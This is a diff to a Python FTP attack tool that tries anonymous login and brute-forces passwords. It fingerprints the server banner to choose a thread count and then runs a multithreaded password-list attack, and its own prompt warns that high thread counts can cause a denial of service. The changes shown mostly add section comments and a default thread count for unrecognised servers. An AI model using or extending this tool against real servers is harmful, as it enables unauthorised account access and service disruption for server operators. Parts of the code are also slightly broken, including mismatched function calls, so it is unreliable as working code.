@@ -16,12 +16,14 @@ start = ''
 def Start0():
 	print("Welcome to the FTP Anonymous login/Brute Force Module")
 	print("Target Host IP required")
-	print("Target Host IP List, Password List are Optional")
+	print("Target Host IP List, Password List required for Brute Force")
+	print("Tuned for FileZilla, vsFTPd, and Xlight servers")
 	print("--------------------------------------------------------")
 	print("Option 1: Anonymous Login")
 	print("Option 2: Brute Force")
 	Start1()
 
+## -- collecting target information -- ##
 def Start1():
 	ftpTarget = input("Target Host: ")
 	if validIP.match(ftpTarget):
@@ -31,6 +33,7 @@ def Start1():
 		print('Please enter a valid IP')
 		Start1()
 
+## -- option selection -- ##
 def Start2(ftpTarget, tCode):
 	answeR = input('Select an Option. [1]: ')
 	if(answeR == '' or answeR == '1'):
@@ -38,6 +41,7 @@ def Start2(ftpTarget, tCode):
 	elif(answeR == '2'):
 		ftpinitBF(ftpTarget, tCode)
 
+## -- checking if target is listening on FTP port/ selecting threads if possible - ##
 def ftpCheck(ftpTarget):
 	try:
 		ftp = ftplib.FTP(ftpTarget)
@@ -48,14 +52,15 @@ def ftpCheck(ftpTarget):
 			tCode = 50
 		elif ('Xlight' in response):
 			tCode = 1500
-		elif ('CompleteFTP' in response):
-		    print('CompleteFTP detected - Adjust wait timer to 6 Seconds.')
-#		ftp.quit()
+		else:
+			tCode = 50
+			print('Different FTP identified. Defaulting to 50 Threads')
 		return(tCode)
 	except Exception as E:
 		print('Target Host down or FTP is being filtered by Firewall')
 		Start1()
-
+		
+## -- anonymous login section -- ##
 def ftpAnon(ftpTarget):
 	ftp = ftplib.FTP(ftpTarget)	
 	try:
@@ -69,6 +74,7 @@ def ftpAnon(ftpTarget):
 	except Exception as E:
 		print('Anonymous Login Unsuccessful :(')
 
+## -- setting credential parameters -- ##
 def ftpinitBF(ftpTarget, tCode):
 	ftpuName = input('Enter username to BF: ')
 	ftppwFile = input("Password List File: ")
@@ -86,6 +92,7 @@ def ftpinitBF(ftpTarget, tCode):
 		print('Please enter a valid file')
 		ftpinitBF(ftpTarget)
 
+## -- determining default or user selected threads -- ##
 def ftptCountREC(tCode):
 	answeR = input('Use recommended threads based on identified server? [Y/n]: ')
 	if(answeR == '' or answeR == 'y'):
@@ -97,7 +104,9 @@ def ftptCountREC(tCode):
 def ftptCount1(ftpTarget, ftpuName, ftppwFile,tCode):
 	tCount = tCode
 	ftpBF1(ftpTarget, ftpuName, ftppwFile, tCode)
-	
+
+
+## -- user selected thread section -- ##	
 def ftptCount2(ftpTarget, ftpuName, ftppwFile,tCode):
 	tCount = int(input('How many threads? 400 MAX - Can cause DOS: '))
 	if tCount in range(1,1501):
@@ -112,7 +121,8 @@ def ftptCount2(ftpTarget, ftpuName, ftppwFile,tCode):
 	else:
 		print('Invalid Selection')
 		ftptCount(ftpTarget, ftpuName, ftppwFile)
-					
+
+## -- threading/ pool map section -- ##					
 def ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount):
 	global start
 	pooL = ThreadPool(tCount)
@@ -129,6 +139,7 @@ def ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount):
 	pooL.close()
 	pooL.join()
 
+## -- FTP BF code portion - within pools -- ##
 def ftpBF2(cB):
 	global i
 	pD = cB[0].strip()
@@ -149,7 +160,7 @@ def ftpBF2(cB):
 		progress(i,tT)
 		pass
 	
-		
+## -- progress bar section -- ##
 def progress(count, total):
 	bar_len = 38
 	filled_len = int(round(bar_len * count / float(total)))
